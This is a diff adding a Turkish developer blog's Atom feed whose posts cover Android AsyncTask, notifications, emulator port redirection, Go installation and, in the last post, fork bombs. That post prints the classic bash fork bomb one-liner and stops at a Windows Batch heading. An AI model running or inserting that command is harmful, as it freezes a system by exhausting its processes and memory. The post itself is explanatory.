@@ -1,0 +1,827 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>Mehmet Başal</title>
+ <link href="http://mhmtbsl.net/atom.xml" rel="self"/>
+ <link href="http://mhmtbsl.net/"/>
+ <updated>2014-08-28T12:07:23+03:00</updated>
+ <id>http://mhmtbsl.net</id>
+ <author>
+   <name>Mehmet Başal</name>
+   <email></email>
+ </author>
+
+ 
+ <entry>
+   <title>Android - AsyncTask Kullanımı</title>
+   <link href="http://mhmtbsl.net/2014/02/12/android-asynctask-kullanimi/"/>
+   <updated>2014-02-12T15:17:00+02:00</updated>
+   <id>http://mhmtbsl.net/2014/02/12/android-asynctask-kullanimi</id>
+   <content type="html">&lt;p&gt;&lt;code&gt;AsyncTask&lt;/code&gt;, ana thread ile arka plan işlemlerini birleştirmemize sağlıyan güzide
+bir Android sınıfı. Bilindiği üzere bazı sebeblerden (mesela &lt;code&gt;performans&lt;/code&gt;) dolayı
+Android&amp;#39;i geliştiren abilerimiz ana thread bazı işlemleri yapmamızı
+yasaklamışlar(&lt;code&gt;Network&lt;/code&gt; işlemleri gibi). Kullanmamız için bize &lt;code&gt;Thread&lt;/code&gt; sınıfını
+özelleştirip &lt;code&gt;AsyncTask&lt;/code&gt; sınıfını sunmuşlar. &lt;code&gt;Thread&lt;/code&gt;lerden farklı olarak
+arka plan işlemi hakkında aşama aşama bilgi sahibi olabiliyoruz. &amp;lt;!-- more --&amp;gt;  &lt;/p&gt;
+
+&lt;h3&gt;Nasıl Kullanılır ?&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    private class ArkaplanIslemi extends AsyncTask&amp;lt;var1, var2, var3&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Önce yukardaki gibi sınıfızı AsyncTask sınıfından extends ediyoruz. Burada
+bilmeniz gereken var1, var2 ve var3 un ne olduğu.  &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;var1 = Ana threadten AsyncTask verilecek değişken( örneğin dosya indirme
+işlemi yapılacaksa URL)&lt;/li&gt;
+&lt;li&gt;var2 = Arka plan işlemi sürerken aşamalar arasında bilgi alışverişi için
+kullanılacak değişken( 100 dosya inecek sizde her 25 dosya indiğinde kullanıcı
+bildirmek istiyorsanız int verebilirsiniz.)&lt;/li&gt;
+&lt;li&gt;var3 = Arka plan işlemi bittiğinde ana threade dönülecek değişken tipi&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bunları söyledikten sonra artık AsyncTask&amp;#39;ın aşamlarına geçebiliriz.&lt;/p&gt;
+
+&lt;h4&gt;onPreExecute()&lt;/h4&gt;
+
+&lt;p&gt;Bu aşamada daha arkaplan işlemi başlamamıştır. Ana thread üzerinde değişiklik
+yapabilirsiniz. Örneğin; bir TextView&amp;#39;in içeriğini &amp;quot;indirme işlemi başlıyor&amp;quot;
+olarak değiştirebilirisiniz.&lt;/p&gt;
+
+&lt;h4&gt;doInBackground(var1...)&lt;/h4&gt;
+
+&lt;p&gt;Bu aşamada artık arkaplan işlemi başlamış durumda. Ana thread&amp;#39;ten alınan veriler
+burda işleniyor.&lt;/p&gt;
+
+&lt;h4&gt;onProgressUpdate(var2...)&lt;/h4&gt;
+
+&lt;p&gt;Bu aşamada ise arkaplan işlemi devam ederken, ana thread&amp;#39;e (yani kullanıcıya)
+bilgi verme işlemi yapılır. Örneğin; &amp;quot;50 dosya indi.&amp;quot; gibi.&lt;/p&gt;
+
+&lt;h4&gt;onPostExecute(var3...)&lt;/h4&gt;
+
+&lt;p&gt;Artık arka plan işlemi bitmiştir. Sonucun ana thread&amp;#39;e döndürüldüğü aşamadır.&lt;/p&gt;
+
+&lt;p&gt;Sınıfı çağırma işlemide:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    ArkaplanIslemi.execute(argumanlar...)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+ </entry>
+ 
+ <entry>
+   <title>Android - Bildirim(Notification) Oluşturma</title>
+   <link href="http://mhmtbsl.net/android/notification/bildirim/olu%C5%9Fturma/2014/01/31/android-bildirim-notification-olusturma/"/>
+   <updated>2014-01-31T17:11:00+02:00</updated>
+   <id>http://mhmtbsl.net/android/notification/bildirim/olu%C5%9Fturma/2014/01/31/android-bildirim-notification-olusturma</id>
+   <content type="html">&lt;p&gt;Android uygulama geliştirirken biraz daha kullanıcı dostu olmak için
+bildirimleri kullanabilirsiniz. Kullanıcı dostu olmanın yanında uygulamanın
+türüne göre kullanıcıya istediğiniz durumlarda bilgi verebilirsiniz. Mesela bir
+doviz uygulaması geliştiriyorsunuz ve dolar belirli bir seviyenin üstüne
+çıktığında ya da düştüğünde kullanıcıyı bilgilendirmek isteyebilirsiniz.   &lt;/p&gt;
+
+&lt;p&gt;Oluşturma işlemini adımlara bölersek: &amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Bildirimi tıklanınca açılcak sınıfı ayarlama&lt;/li&gt;
+&lt;li&gt;Başka bir buton eklenecekse onun için açılcak sınıf ve ya çalışacak
+fonskiyonu ayarlama&lt;/li&gt;
+&lt;li&gt;Bildirimi oluşturma&lt;/li&gt;
+&lt;li&gt;Uyarı türünü belirleme ( sesli, titreşim vb)&lt;/li&gt;
+&lt;li&gt;Son aşamada bildirimi yayınlama&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* Bildirime tıklanınca açılacak activity */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Oku_intent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AcilacakActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PendingIntent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_oku&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PendingIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Oku_intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Sil butonu için Broadcast mesajı  */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sil_intent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Sil_intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;com.deneme.uyg.DEL_INTENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PendingIntent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_sil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PendingIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBroadcast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sil_intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Bildirimi oluşturmaya başlıyoruz */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Notification&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bildirim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;cm&quot;&gt;/* Bildirim başlığı */&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentTitle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Mesaj geldi!!&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;cm&quot;&gt;/* Bildirim için icon ve intent atama ( drawable klasoru içinde resim1.jpg olması lazım) */&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSmallIcon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;drawable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;resim1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_oku&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;cm&quot;&gt;/* Sil butonu için icon ve intent ataması */&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;drawable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;del&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Sil&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_sil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Bildirim yayınlamak için bir NotificationManager sınıfını kullanacağız */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;NotificationManager&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notificationManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotificationManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getSystemService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NOTIFICATION_SERVICE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Bildirim otomatik yok olacak tıklanmadan sonra */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bildirim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;FLAG_AUTO_CANCEL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Sesle uyarı yapacak */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bildirim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;defaults&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DEFAULT_SOUND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* artık yayınlama işlemini gerçekleştirebiliriz */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;notificationManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bildirim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Burada önemli olan bildirimi yayınlarken veridiğimiz &lt;code&gt;0&lt;/code&gt; değeri. Bildirimin id değerini belirtiyor. Bu bildirimi silme ya da güncelleme işlemi yaparken ona ihtiyaç duyacağız.
+Sonunda aşığıdaki gibi bir çıktı elde etmemiz gerekiyor.&lt;br&gt;
+&lt;img src=&quot;/images/noti.png&quot; alt=&quot;resim&quot;&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Android Sunucuya Terminalden Bağlanma</title>
+   <link href="http://mhmtbsl.net/2014/01/30/android-sunucuya-terminalden-baglanma/"/>
+   <updated>2014-01-30T20:28:00+02:00</updated>
+   <id>http://mhmtbsl.net/2014/01/30/android-sunucuya-terminalden-baglanma</id>
+   <content type="html">&lt;p&gt;Android üzerinde çalışan bir sunucuya terminalden nasıl bağlanırız ?&lt;br&gt;
+Öncelikle sunucunun &lt;code&gt;1234&lt;/code&gt; nolu port üzerinde çalıştığını varsayalım. Uygulamanızı
+AVD üzerinde çalıştırın ve sunucuyu aktif hale getirin. &amp;lt;!-- more --&amp;gt;Şimdi &lt;code&gt;telnet&lt;/code&gt; ile AVD
+ye bağlanmamız gerek. AVD&amp;#39;nin port numarası pencere başlığında yazar.(genelde
+5554 tür)&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    telnet localhost 5554
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;yukarıdaki komutla AVDye bağlanmış oluyoruz. Eğer işlem başarılı ise bir komut
+istemcisi göreceksiniz.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    redir add tcp:5353:1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Bu komutla ise 1234 portunu(sunucunun çalıştığı port) 5353 numaralı porta
+yonlendirmiş oluyor. Şimdi &lt;code&gt;exit&lt;/code&gt; diyerek terminale dönelim. Artık  aşağıdaki komutla
+sunucuyu bağlanalım.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    telnel localhost 5353
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Ve işlem tamam :)&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Android - NetworkOnMainThreadException</title>
+   <link href="http://mhmtbsl.net/2014/01/29/android-networkonmainthreadexception/"/>
+   <updated>2014-01-29T12:55:00+02:00</updated>
+   <id>http://mhmtbsl.net/2014/01/29/android-networkonmainthreadexception</id>
+   <content type="html">&lt;p&gt;Eğer network işlemleri yapan bir android uygulaması geliştiriyorsanız, büyük ihtimal ile yukarıda başlıkta yazdığım hata ile 
+karşılaşmıssınızdır. &amp;lt;!-- more --&amp;gt;
+Aslında internette çok küçük bir araştırma yaparak bu konu hakkında yazılmış sorulara ve verilen cevaplara ulaşabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;Ben biraz bu hata nedir ondan bahsedeyim. Kabaca ismine bakarsak, “ana threadte(iş parçasında) network işlemi yapıyorsun” diyor. Android işletim sistemini geliştiren abilerimiz buna izin vermemişler. Bu şekilde tasarlamalarının sebebi ise ağır işlerin ana threadte yapılmasının performansı düşürmesidir.&lt;/p&gt;
+
+&lt;p&gt;Peki bu hata nasıl çözülür? Temelde 3 yolu bulunmakta:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;StrictMode kullanarak Thread politikasını değiştirmek&lt;/li&gt;
+&lt;li&gt;Başka bir Thread oluşturmak&lt;/li&gt;
+&lt;li&gt;ASyncTask kullanmak&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Birinci yol pek tavsiye edilen bir çözüm değil. Nedenine gelirsek bunu yaparak basitçe şunu diyorsunuz “Ben, Android’i geliştiren abilerden daha iyi biliyorum. Ana threadte ağır işlemleri yaparsam performans kaybı olmaz.” Bu probleme kötü bir yaklaşım, uygulamanız inanılmaz derecede yavaş olursa benden günah gitti. :)&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;n&quot;&gt;StrictMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ThreadPolicy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;policy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;StrictMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ThreadPolicy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;permitAll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;StrictMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setThreadPolicy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;policy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;İkinci yol ise sıradan Thread kullanımı;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;networkIslemi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+           &lt;span class=&quot;cm&quot;&gt;/* Kodlarınız burada olacak */&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+           &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;networkIslemi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Üçüncü yol AsyncTask ise aslında android için özelleştrilmiş thread kullanımı diyebiliriz.
+Normal threadlerden farklı olarak AsyncTask kullanarak işlemi aşama aşama takip edebilirsiniz.
+İlereyen günlerde bu konu ile ilgili bir örnek yazmayı düşünüyorum. Şimdilik 
+&lt;a href=&quot;http://developer.android.com/reference/android/os/AsyncTask.html&quot;&gt;burdan&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Debian/Ubuntu Golang Kurulumu</title>
+   <link href="http://mhmtbsl.net/2013/10/05/debian-slash-ubuntu-golang-kurulumu/"/>
+   <updated>2013-10-05T17:15:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/10/05/debian-slash-ubuntu-golang-kurulumu</id>
+   <content type="html">&lt;p&gt;Sisteminize uygun sürümü &lt;a href=&quot;http://code.google.com/p/go/downloads/list&quot;&gt;indirin&lt;/a&gt;
+Eğer önceden kurulum yaptıysanız aşağıdaki komutu çalıştırın &amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    $ rm -r /usr/local/go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Sıfır kurulum için indirdiğiniz arşivi açın&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    $ tar -C /usr/local -xzf go1.1.linux-xxx.tar.gz 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;PATH değişkenine go’yu ekleyin&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    $ export PATH=$PATH:/usr/local/go/bin  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Aşağıdaki kod parçasını bir text dosyasına yazıp adını ilk.fo diye kaydedin.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-go&quot; data-lang=&quot;go&quot;&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Selamun Aleyküm&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Deneme sürüşü&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    $ go run ilk.fo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+ </entry>
+ 
+ <entry>
+   <title>Fork Bombasi</title>
+   <link href="http://mhmtbsl.net/2013/09/26/fork-bombasi/"/>
+   <updated>2013-09-26T12:55:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/09/26/fork-bombasi</id>
+   <content type="html">&lt;p&gt;Fork bombası, bir prosesin kendini sürekli kopyalarak kullanılarbilir sistem kaynaklarını sömürmesi durumudur.
+CPU ve RAM’i meşgul ederek bilgisayarınızın donmasına neden olur. &lt;/p&gt;
+
+&lt;h1&gt;Fork Bombası Nasıl Yapılır ?&lt;/h1&gt;
+
+&lt;p&gt;Unix türevi bir işletim sistemi kullanıyorsanız, fork sistem çağrısını kullanararak bir fork bombası yapabilirsiniz.&amp;lt;!-- more --&amp;gt;
+fork fonksiyonu bulunduğu prosesin bir kopyasını oluşturur. exec fonksiyonu ilede o kopya prosese isteğiniz bir programı gömebilirsiniz.
+Eğer siz fonksiyonu sonsuz döngüye sokup sürekli kendini kopyalamasını sağlarsınız elinizde nur topu gibi bir fork bombanız olur.
+Çeşitli dillerde gerçekleme yapabilirsiniz. Bir kaç örnek vermek gerekirse:&lt;/p&gt;
+
+&lt;h2&gt;Bash&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;:&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt; :&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Windows Batch&lt;/h2&gt;
